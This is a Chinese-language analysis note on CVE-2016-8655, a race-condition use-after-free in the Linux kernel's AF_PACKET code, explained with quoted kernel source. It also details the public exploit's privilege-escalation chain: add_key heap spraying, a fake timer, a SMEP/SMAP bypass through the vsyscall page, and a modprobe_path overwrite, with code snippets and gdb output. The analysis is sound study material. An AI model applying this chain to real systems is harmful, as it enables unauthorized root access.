# CVE-2016-8655_Linux内核提权漏洞分析笔记

@elemeta

## 漏洞描述

CVE-2016-8655是去年12月5日由philip.pettersson公布的一个Linux内核本地提权漏洞，它是
net/packet/af_packet.c中的一个竞态条件，导致一个定时器可以实现UAF。这个漏洞发现的思路
有点类似于之前的“Dirty Cow”漏洞，值得我们学习。

## 漏洞分析

- 实验环境：Ubuntu x86_64 4.4.0-21-generic #37
- 分析工具：gdb、阅读源代码

### PACKET_MMAP

PACKET_MMAP主要用来提高应用层Socket抓包效率的功能。应用层抓包数据传统的方法是poll + recvmsg，
这需要两次系统调用和一次数据拷贝；PACKET_MMAP则在内核中创建一个RingBuffer并让映射到用户进程空间，
内核直接把抓包数据放到里面，应用层直接读取即可，只需要poll一次系统调用即可，大大的提高了效率。使
用PACKET_MMAP需要实现以下步骤：

    [创建]    socket() -------> 创建一个套接字
              setsockopt() ---> 使用选项PACKET_RX_RING告诉内核创建一个RingBuffer
              mmap() ---------> 在应用程序中映射(mmap)上面创建的RingBuffer

    [抓包]    poll() ---------> 等待数据包通知

    [结束]    close() --------> 关闭套接字，并且释放RingBuffer

设置抓包RingBuffer的代码如下：

    struct tpacket_req {
        unsigned int    tp_block_size;  /* Minimal size of contiguous block */
        unsigned int    tp_block_nr;    /* Number of blocks */
        unsigned int    tp_frame_size;  /* Size of frame */
        unsigned int    tp_frame_nr;    /* Total number of frames */
    };

    setsockopt(fd, SOL_PACKET, PACKET_RX_RING, (void *) &req, sizeof(req))

一个RingBuffer有N个Block组成，一个Block由N个Frame组成，下面是一个例子：
    
     tp_block_size= 4096
     tp_frame_size= 2048
     tp_block_nr  = 2
     tp_frame_nr  = 4
                           RingBuffer
    +----------------------------------------------+
    |       block #1               block #2        |        
    | +---------+---------+  +---------+---------+ |
    | | frame 1 | frame 2 |  | frame 3 | frame 4 | |
    | +---------+---------+  +---------+---------+ |
    +----------------------------------------------+

*详细说明参考内核文档 /Documentation/networking/packet_mmap.txt*

### TPACKET_V3

TPACKET_V3相对于之前的版本多了设置Block的超时时间，超时后调用
prb_retire_rx_blk_timer_expired函数撤销当前的一个block。

    struct tpacket_req3 {
        unsigned int	tp_block_size;	/* Minimal size of contiguous block */
        unsigned int	tp_block_nr;	/* Number of blocks */
        unsigned int	tp_frame_size;	/* Size of frame */
        unsigned int	tp_frame_nr;	/* Total number of frames */
        unsigned int	tp_retire_blk_tov; /* timeout in msecs */
        unsigned int	tp_sizeof_priv; /* offset to private data area */
        unsigned int	tp_feature_req_word;
    };

### 触发漏洞

CVE-2016-8655就是利用TPACKET_V3的这个超时功能，通过竞态条件让它在套接字close以后依然在内核
的定时器队列中工作，我们修改定时器的回调函数指针，当定时器到期后调用我们的shellcode。定时器
是在packet_set_ring()函数里创建的：

    static int packet_set_ring(struct sock *sk, union tpacket_req_u *req_u, 
                               int closing, int tx_ring)
    {
        ...
        switch (po->tp_version) {
            case TPACKET_V3:
            /* Transmit path is not supported. We checked
            * it above but just being paranoid
            */
                if (!tx_ring)
                    init_prb_bdqc(po, rb, pg_vec, req_u); // 这里创建我们需要的定时器
                break;
            default:
                break;
            }
        ...
    }

    static void init_prb_bdqc(struct packet_sock *po, struct packet_ring_buffer *rb, 
                            struct pgv *pg_vec, union tpacket_req_u *req_u)
    {
        ...
        prb_setup_retire_blk_timer(po);
        ...
    }

    static void prb_setup_retire_blk_timer(struct packet_sock *po)
    {
        ...
        prb_init_blk_timer(po, pkc, prb_retire_rx_blk_timer_expired);
        ...
    }

    static void prb_init_blk_timer(struct packet_sock *po,
		struct tpacket_kbdq_core *pkc, void (*func) (unsigned long))
    {
        init_timer(&pkc->retire_blk_timer);  // 创建定时器
        pkc->retire_blk_timer.data = (long)po;
	    pkc->retire_blk_timer.function = func;
	    pkc->retire_blk_timer.expires = jiffies;
    }

再看看修改版本号的代码：

    static int packet_setsockopt(struct socket *sock, int level, int optname, 
                                 char __user *optval, unsigned int optlen)
    {
        ...
        case PACKET_VERSION: {
            ...
            if (po->rx_ring.pg_vec || po->tx_ring.pg_vec) // 这里有检查，如果有RingBuffer不让改版本号
                return -EBUSY;
            ...
            switch (val) {
            case TPACKET_V1:
            case TPACKET_V2:
            case TPACKET_V3:
                po->tp_version = val;
                return 0;
            default:
                return -EINVAL;
            }
        }
        ...
    }

这段代码在设置版本号之前对是否使用了RingBuffer进行判断，如果使用了就拒绝修改，这符合正常的
逻辑。给po->rx_ring.pg_vec赋值的语句是packet_set_ring函数中的swap(rb->pg_vec, pg_vec):

    #define swap(a, b) \
	    do { typeof(a) __tmp = (a); (a) = (b); (b) = __tmp; } while (0)

    static int packet_set_ring(struct sock *sk, union tpacket_req_u *req_u,
		int closing, int tx_ring)
    {
        ...
        mutex_lock(&po->pg_vec_lock);
        if (closing || atomic_read(&po->mapped) == 0) {
            err = 0;
            spin_lock_bh(&rb_queue->lock);
            swap(rb->pg_vec, pg_vec); // 这里给rb->pg_vec赋值
        ...

    }

在swap()语句之前po->rx_ring.pg_vec为0，往上缕，最近一次判断版本号的代码是
init_prb_bdqc()函数的位置。

我们仔细查看这之间的部分，init_prb_bdqc()函数和修改版本号的代码并没有使用
lock_sock()保证互斥，另外lock_sock()、synchronize_net()、mutex_lock()这
些函数是可以引起进程调度的，这样在init_prb_bdqc()之后和swap(rb->pg_vec, pg_vec)
之前这段时间内可以引起竞态条件。当竞态条件发生后，假如我们把之前的版本号改
成TPACKET_V1，那么定时器释放的代码就不会执行：

    if (closing && (po->tp_version > TPACKET_V2)) {
		/* Because we don't support block-based V3 on tx-ring */
		if (!tx_ring)
			prb_shutdown_retire_blk_timer(po, rb_queue);  // 该函数不会执行
	}

当套接字关闭时，会调用packet_set_ring()函数来释放RingBuffer。

    static int packet_release(struct socket *sock)
    {
        ...
        if (po->rx_ring.pg_vec) {
            memset(&req_u, 0, sizeof(req_u));
            packet_set_ring(sk, &req_u, 1, 0);
        }
        ...
    }

定时器retire_blk_timer所分配的内存也随着struct packet_sock被free了，然
而定时器还在系统定时器队列中等待被触发，这里有可能出现Use-After-free的时机。

    struct timer_list {
        ...
        unsigned long expires;
	    void (*function)(unsigned long); // 这里有一次被调用的机会，但是内存区域已经free了
        ...
    };

    struct tpacket_kbdq_core {
        ...
        /* timer to retire an outstanding block */
	    struct timer_list retire_blk_timer;
    };

    struct packet_ring_buffer {
        ...
        struct tpacket_kbdq_core	prb_bdqc;
    }

    struct packet_sock {
        ...
        struct packet_ring_buffer	rx_ring;
        ...
    };

### UAF

我们的目的是利用UAF来覆盖struct time_list->function函数指针。提权程序使用了add_key系统调
用进行堆喷射。该系统调用在/security/keys/keyctl.c中定义:

    SYSCALL_DEFINE5(add_key, const char __user *, _type, const char __user *, _description,
            const void __user *, _payload, size_t, plen, key_serial_t, ringid)
    {
       ...
        /* create or update the requested key and add it to the target keyring */
	    key_ref = key_create_or_update(keyring_ref, type, description,
				       payload, plen, KEY_PERM_UNDEF, KEY_ALLOC_IN_QUOTA);
        ...
    }

    key_ref_t key_create_or_update(...)
    {
        ...
        prep.data = payload;
        prep.datalen = plen;
        if (index_key.type->preparse) {
            ret = index_key.type->preparse(&prep);
        ...
    }

    int user_preparse(struct key_preparsed_payload *prep)
    {
        struct user_key_payload *upayload;
        size_t datalen = prep->datalen;

        if (datalen <= 0 || datalen > 32767 || !prep->data)
            return -EINVAL;

        // 利用这里进行堆喷射
        upayload = kmalloc(sizeof(*upayload) + datalen, GFP_KERNEL);
        if (!upayload)
            return -ENOMEM;

        /* attach the data */
        prep->quotalen = datalen;
        prep->payload.data[0] = upayload;
        upayload->datalen = datalen;
        memcpy(upayload->data, prep->data, datalen);
        return 0;
    }

    // payload之前的数据
    struct user_key_payload {
        struct rcu_head	rcu;		/* RCU destructor */
        unsigned short	datalen;	/* length of this data */
        char		data[0];	/* actual data */
    };

    struct callback_head {
        struct callback_head *next;
        void (*func)(struct callback_head *head);
    } __attribute__((aligned(sizeof(void *))));
    #define rcu_head callback_head


该函数分配的堆数据结构是：

                +-------------------------+ <- 0
                | struct user_key_payload |
                +-------------------------+ <- sizeof(user_key_payload)
                |                         |
                .    payload              '
                .                         .
                +-------------------------+ <- sizeof(user_key_payload) + len(payload)

接下来要构造堆喷射的数据了，因为释放的是struct packet_sock，我们就模仿它，在retire_blk_timer
位置填充struct time_list结构体：

                +-------------------------+ <- 0
                | struct user_key_payload |
        0x12 -> +-------------------------+ <- sizeof(user_key_payload)
                |                         |
                .                         '
                .                         .
                |                         |
       0x370 -> +-------------------------+ <- pos(retire_blk_timer)
                | struct timer_list       |
                +-------------------------+
                |                         |
                .                         .
       0x580 -> +-------------------------+ <- sizeof(packet_sock)

因为struct user_key_payload是系统添加上去的，应用层传入payload时要扣除user_key_payload的大小,
另外计算retire_blk_timer的偏移时也要扣除它。

    // struct user_key_payload占24字节
    syscall(__NR_add_key, "user", "wtf", exploitbuf, 1048 - 24, -2);

### Bypass SMEP/SMAP

内核函数call_usermodehelper()的作用是以root权限运行一个用户态的程序，如果能用他来执行我们的提权
程序就好了。利用代码中使用了内核的模块自动加载(request_module()函数)功能，内核中有时需要加载一些
依赖的模块，内核便会调用/sbin/modprobe程序去完成模块加载，他需要call_usermodehelper()函数去执行
它。

    #define KMOD_PATH_LEN 256
    char modprobe_path[KMOD_PATH_LEN] = "/sbin/modprobe";

    int __request_module(bool wait, const char *fmt, ...)
    {
        ...
        ret = call_modprobe(module_name, wait ? UMH_WAIT_PROC : UMH_WAIT_EXEC);
        ...
    }

    static int call_modprobe(char *module_name, int wait)
    {
        ...
        info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,
                        NULL, free_modprobe_argv, NULL);
        ...
        return call_usermodehelper_exec(info, wait | UMH_KILLABLE);
        ...
    }

实际情况也是这样：

    (gdb) p modprobe_path 
    $1 = "/sbin/modprobe", '\000' <repeats 241 times>

内核变量modprobe_path保存的是modprobe程序的路径，我们把它改成提权程序的路径，这样只要触发
模块自动加载，我们的提权程序就能以root权限启动了。我们利用sysctl + proc_dostring()的组合
来实现写modprobe_path变量。

- 内核中找一个用户空间可以写入的地址来存放struct ctl_table结构体，这里选用VSYSCALL的页。
  内核中VSYSCALL地址是一个固定的地址0xffffffffff600000。大小是一个页4096字节。

        #define VSYSCALL_ADDR (-10UL << 20) // 0xffffffffff600000

        static struct vm_area_struct gate_vma = {
            .vm_start	= VSYSCALL_ADDR,
            .vm_end		= VSYSCALL_ADDR + PAGE_SIZE,
            .vm_page_prot	= PAGE_READONLY_EXEC,
            .vm_flags	= VM_READ | VM_EXEC,
            .vm_ops		= &gate_vma_ops,
        };
   
   每个应用程序都会自动映射VSYSCALL的地址空间，拥有只读和可执行权限。

        [elemeta@emcos66x64 ~]$ grep vsyscall /proc/self/maps
        ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0        [vsyscall]

- 第一次触发漏洞，执行内核函数set_memory_rw()让用户空间对VSYSCALL页有写权限。我们可以利用的范围是
  0xffffffffff600000 - 0xffffffffff601000。


- 我们选择在VSYSCALL_ADDR+0x850处构造struct ctl_table结构体, 让proc_handler = proc_dostring(), 
  data = modprobe_path。
- 第二次触发漏洞，执行内核函数register_sysctl_table注册该ctl_table。路径是/proc/sys/hack、我们
  用它来修改modprobe_path变量的内容。

        c = (struct ctl_table *)(VSYSCALL+0x850);
        memset((char *)(VSYSCALL+0x850), '\x00', 1952);
        strcpy((char *)(VSYSCALL+0xf00),"hack");
        memcpy((char *)(VSYSCALL+0xe00),"\x01\x00\x00\x00",4);
        c->procname = (char *)(VSYSCALL+0xf00);
        c->mode = 0666;
        c->proc_handler = (void *)(off->proc_dostring);
        c->data = (void *)(off->modprobe_path);
        c->maxlen=256;
        c->extra1 = (void *)(VSYSCALL+0xe00);
        c->extra2 = (void *)(VSYSCALL+0xd00);

        (gdb) x/32wx 0xffffffffff600000+0x850  // struct ctl_table
        0xffffffffff600850: 0xff600f00  0xffffffff  0x81e48e80  0xffffffff
        0xffffffffff600860: 0x00000100  0x000001b6  0x00000000  0x00000000
        0xffffffffff600870: 0x81087cf0  0xffffffff  0x00000000  0x00000000
        0xffffffffff600880: 0xff600e00  0xffffffff  0xff600d00  0xffffffff
        0xffffffffff600890: 0x00000000  0x00000000  0x00000000  0x00000000
        (gdb) x/s 0xffffffffff600000+0xf00    // c->procname
        0xffffffffff600f00: "hack"
        (gdb) x/1wx 0xffffffffff600000+0xe00  //c->extra1
        0xffffffffff600e00: 0x00000001
        (gdb) x/1wx 0xffffffffff600000+0xd00  // c->extra2
        0xffffffffff600d00:	0x00000000

        root@emub64:~# grep ffffffff81e48e80 /proc/kallsyms  // c->data
        ffffffff81e48e80 D modprobe_path
        root@emub64:~# grep ffffffff81087cf0 /proc/kallsyms  // c->proc_handler
        ffffffff81087cf0 T proc_dostring

- 把提权程序(也就是自己)的路径写入/proc/sys/hack文件，实际上就是写modprobe_path内核变量了。
- 触发模块自动加载，提权程序就以root权限启动了。

*详细请看利用代码chocobo_root.c的注释*

## 漏洞修复

该漏洞的核心是在packet_set_ring()函数中，init_prb_bdqc()之后和swap(rb->pg_vec, pg_vec)之前
这段时间内有可能被其他线程修改AF_PACKET的版本号，修复的方法就是要保证packet_set_ring()函数和修
改版本号的代码是互斥的即可。请参见
https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=84ac7260236a49c79eede91617700174c2c19b0c

## 总结

整个利用过程如下：

1. 创建一个协议族是AF_PACKET的socket，
2. 几乎同时给该socket进行创建PACKET_MMAP功能的RingBuffer和切换AF_PACKET版本号的操作，直到发生
   竞态条件。然后出现UAF的时机。
3. 使用add_key系统调用进行堆喷射，覆盖已经释放的定时器，等待被执行。
4. 通过[vsyscall] + sysctl + request_module()组合bypass SMEP/SMAP，并以root权限执行提权程序。
5. enjoy!

这个漏洞和CVE-2016-5915(dirtycow)有异曲同工之妙，都是利用进程调度机制，在代码执行的间隙寻找出
可利用的竞争条件。我想这类的漏洞使用Fuzz的方法是很难做到的，这估计需要研究者深刻理解代码的用意，
并且对Linux内核底层的运作机制非常的了解才能发现。当一个漏洞出现时，我们的确要认真揣摩发现者的思
路，在我们审计代码过程中也要带上前人的思路去思考，学习他们的经验。

## 参考

- https://www.exploit-db.com/exploits/40871/
- http://www.openwall.com/lists/oss-security/2016/12/06/1
- https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=84ac7260236a49c79eede91617700174c2c19b0c
- http://bobao.360.cn/learning/detail/3267.html
- http://bobao.360.cn/learning/detail/3321.html
- https://www.kernel.org/pub/linux/kernel/v4.x/linux-4.4.tar.xz
